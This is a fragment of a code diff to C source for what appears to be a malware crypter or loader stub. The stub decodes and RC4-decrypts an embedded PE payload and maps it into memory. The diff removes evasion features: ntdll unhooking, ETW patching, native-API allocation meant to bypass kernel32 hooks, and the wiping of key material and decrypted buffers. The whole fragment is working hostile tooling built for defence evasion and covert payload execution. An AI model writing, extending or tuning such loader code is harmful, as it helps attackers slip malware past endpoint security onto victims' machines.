-        BYTE *ntdll = _find_module(H_NTDLL);
-        if (ntdll) {
-#if EVASION_UNHOOK
-            _unhook_ntdll(ntdll, &api);
-#endif
-#if EVASION_ETW
-            _patch_etw(ntdll, &api);
-#endif
-            /* NOTE: re-resolution removed — unhooking changes the CODE at
-             * the function address, not the export table.  The pointers
-             * from _resolve_apis() already point to the right addresses;
-             * the bytes there are now clean. */
-            SLOG("[stub] unhook/etw done");
-        }
-    }
-#else
-    SLOG("[stub] unhook/etw DISABLED for testing");
-#endif
 
     /* Phase 2: Derive RC4 key from seed */
     SLOG("[stub] deriving key...");
@@ -1343,12 +854,12 @@ void _stub_entry(void) {
     _derive_key(g_res_cfg, RES_CFG_SIZE, rc4_key, DERIVED_KEY_LEN);
 
     /* Phase 2.5: Nibble-decode the payload (entropy ~4.0 → raw ciphertext)
-     * g_res_data is nibble-encoded (2x size), decode into a fresh buffer.
-     * Uses NtAllocateVirtualMemory from ntdll to bypass kernel32 hooks. */
+     * g_res_data is nibble-encoded (2x size), decode into a fresh buffer. */
     SLOG("[stub] nibble decoding...");
-    unsigned char *decoded = (unsigned char *)_nt_alloc(&api, RES_DECODED_SIZE);
+    unsigned char *decoded = (unsigned char *)api.pVirtualAlloc(
+        NULL, RES_DECODED_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!decoded) {
-        SLOG("[stub] FATAL: alloc for decode buffer");
+        SLOG("[stub] FATAL: VirtualAlloc for decode buffer");
 #ifdef STUB_DEBUG
         _dbg_close();
 #endif
@@ -1363,11 +874,6 @@ void _stub_entry(void) {
         unsigned char S[256];
         _rc4_init(S, rc4_key, DERIVED_KEY_LEN);
         _rc4_crypt(S, decoded, RES_DECODED_SIZE);
-        /* Wipe RC4 state — contains key-derived permutation */
-        {
-            volatile unsigned char *p = S;
-            for (int i = 0; i < 256; i++) p[i] = 0;
-        }
     }
 
     /* Wipe key from stack */
@@ -1382,9 +888,9 @@ void _stub_entry(void) {
 #ifdef STUB_DEBUG
         _dbg_close();
 #endif
-        _nt_free(&api, decoded);
+        api.pVirtualFree(decoded, 0, MEM_RELEASE);
         api.pExitProcess(1);
-        return;
+        return;  /* unreachable, but satisfies compiler */
     }
     SLOG("[stub] decrypt OK");
 
@@ -1394,17 +900,13 @@ void _stub_entry(void) {
 #ifdef STUB_DEBUG
         _dbg_close();
 #endif
-        _nt_free(&api, decoded);
+        api.pVirtualFree(decoded, 0, MEM_RELEASE);
         api.pExitProcess(1);
         return;
     }
 
     /* Wipe and free the decoded PE buffer — it's mapped into sections now */
-    {
-        volatile unsigned char *p = decoded;
-        for (DWORD i = 0; i < RES_DECODED_SIZE; i++) p[i] = 0;
-    }
-    _nt_free(&api, decoded);
+    api.pVirtualFree(decoded, 0, MEM_RELEASE);
 
 #ifdef STUB_DEBUG
     _dbg_close();
